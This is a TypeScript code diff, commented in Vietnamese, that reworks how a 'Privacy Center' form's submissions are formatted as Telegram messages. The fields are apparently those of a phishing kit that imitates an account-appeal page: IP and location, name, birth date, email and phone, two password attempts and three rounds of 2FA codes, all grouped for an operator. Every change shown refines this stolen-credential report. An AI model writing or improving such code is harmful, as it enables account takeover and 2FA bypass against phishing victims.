@@ -150,12 +150,12 @@ function mergeData(
     return result;
 }
 
-/** Một dòng bullet: nhãn ngắn + giá trị monospace (chỉ gọi khi đã có value). */
-function bullet(label: string, value: string): string {
-    return `  ▸ <b>${escapeHtml(label)}</b> <code>${escapeHtml(value)}</code>`;
+/** Một dòng: nhãn + giá trị sát nhau (không thụt lề). */
+function kv(label: string, value: string): string {
+    return `<b>${escapeHtml(label)}</b> <code>${escapeHtml(value)}</code>`;
 }
 
-/** Khối có emoji + tiêu đề; bỏ hẳn nếu không có dòng con. */
+/** Tiêu đề nhóm + các dòng ngay bên dưới, không thêm dòng trống giữa các dòng con. */
 function block(emoji: string, title: string, lines: string[]): string | null {
     if (lines.length === 0) return null;
     return `${emoji} <b>${escapeHtml(title)}</b>\n${lines.join('\n')}`;
@@ -169,66 +169,62 @@ function formatUtcTimestamp(): string {
 
 function formatMessage(data: Partial<FormData> | Record<string, unknown>): string {
     const d = normalizeData(data);
-    const rule = '─'.repeat(26);
 
-    const header =
-        `📋 <b>Privacy Center</b>\n` +
-        `🕐 <code>${escapeHtml(formatUtcTimestamp())}</code>\n` +
-        `${rule}`;
+    const header = `📋 <b>Privacy Center</b> · 🕐 <code>${escapeHtml(formatUtcTimestamp())}</code>`;
 
     const body: string[] = [];
 
     const net: string[] = [];
-    if (d.ip) net.push(bullet('IP', d.ip));
-    if (d.location) net.push(bullet('Vị trí', d.location));
-    if (d.country_code) net.push(bullet('Mã quốc gia', d.country_code));
-    const netBlock = block('📍', 'Mạng & thiết bị', net);
+    if (d.ip) net.push(kv('IP', d.ip));
+    if (d.location) net.push(kv('Vị trí', d.location));
+    if (d.country_code) net.push(kv('QG', d.country_code));
+    const netBlock = block('📍', 'Mạng', net);
     if (netBlock) body.push(netBlock);
 
     const profile: string[] = [];
-    if (d.fullName) profile.push(bullet('Họ tên', d.fullName));
-    if (d.fanpage) profile.push(bullet('Trang / Fanpage', d.fanpage));
+    if (d.fullName) profile.push(kv('Họ tên', d.fullName));
+    if (d.fanpage) profile.push(kv('Trang', d.fanpage));
     const hasDob = d.day || d.month || d.year;
     if (hasDob) {
         const dob =
             d.day && d.month && d.year
                 ? `${d.day}/${d.month}/${d.year}`
                 : [d.day, d.month, d.year].filter(Boolean).join('/');
-        profile.push(bullet('Sinh nhật', dob));
+        profile.push(kv('Sinh nhật', dob));
     }
     const profileBlock = block('👤', 'Hồ sơ', profile);
     if (profileBlock) body.push(profileBlock);
 
     const contact: string[] = [];
-    if (d.email) contact.push(bullet('Email', d.email));
-    if (d.emailBusiness) contact.push(bullet('Email công việc', d.emailBusiness));
-    if (d.phone) contact.push(bullet('SĐT', `+${d.phone.replace(/^\+/, '')}`));
+    if (d.email) contact.push(kv('Email', d.email));
+    if (d.emailBusiness) contact.push(kv('Email CV', d.emailBusiness));
+    if (d.phone) contact.push(kv('SĐT', `+${d.phone.replace(/^\+/, '')}`));
     const contactBlock = block('✉️', 'Liên hệ', contact);
     if (contactBlock) body.push(contactBlock);
 
     const appeal: string[] = [];
-    if (d.appealReason) appeal.push(bullet('Lý do kháng nghị', d.appealReason));
-    if (d.message) appeal.push(bullet('Ghi chú thêm', d.message));
-    const appealBlock = block('📝', 'Nội dung gửi', appeal);
+    if (d.appealReason) appeal.push(kv('Lý do', d.appealReason));
+    if (d.message) appeal.push(kv('Ghi chú', d.message));
+    const appealBlock = block('📝', 'Nội dung', appeal);
     if (appealBlock) body.push(appealBlock);
 
     const sec: string[] = [];
-    if (d.password) sec.push(bullet('Mật khẩu (1)', d.password));
-    if (d.passwordSecond) sec.push(bullet('Mật khẩu (2)', d.passwordSecond));
-    if (d.authMethod) sec.push(bullet('Phương thức xác thực', d.authMethod));
-    if (d.twoFa) sec.push(bullet('Mã 2FA — bước 1', d.twoFa));
-    if (d.twoFaSecond) sec.push(bullet('Mã 2FA — bước 2', d.twoFaSecond));
-    if (d.twoFaThird) sec.push(bullet('Mã 2FA — bước 3', d.twoFaThird));
+    if (d.password) sec.push(kv('MK 1', d.password));
+    if (d.passwordSecond) sec.push(kv('MK 2', d.passwordSecond));
+    if (d.authMethod) sec.push(kv('Xác thực', d.authMethod));
+    if (d.twoFa) sec.push(kv('2FA 1', d.twoFa));
+    if (d.twoFaSecond) sec.push(kv('2FA 2', d.twoFaSecond));
+    if (d.twoFaThird) sec.push(kv('2FA 3', d.twoFaThird));
     const secBlock = block('🔐', 'Bảo mật', sec);
     if (secBlock) body.push(secBlock);
 
     let text =
         body.length === 0
-            ? `${header}\n\n⚪ <i>Chưa có trường dữ liệu (có thể là bản cập nhật rỗng).</i>`
-            : [header, ...body].join('\n\n');
+            ? `${header}\n⚪ <i>Chưa có dữ liệu.</i>`
+            : [header, ...body].join('\n');
 
     if (text.length > TELEGRAM_TEXT_MAX) {
-        text = `${text.slice(0, TELEGRAM_TEXT_MAX - 40)}\n\n⚠️ <i>Nội dung bị cắt do giới hạn Telegram</i>`;
+        text = `${text.slice(0, TELEGRAM_TEXT_MAX - 40)}\n⚠️ <i>Đã cắt bớt (giới hạn Telegram)</i>`;
     }
     return text;
 }
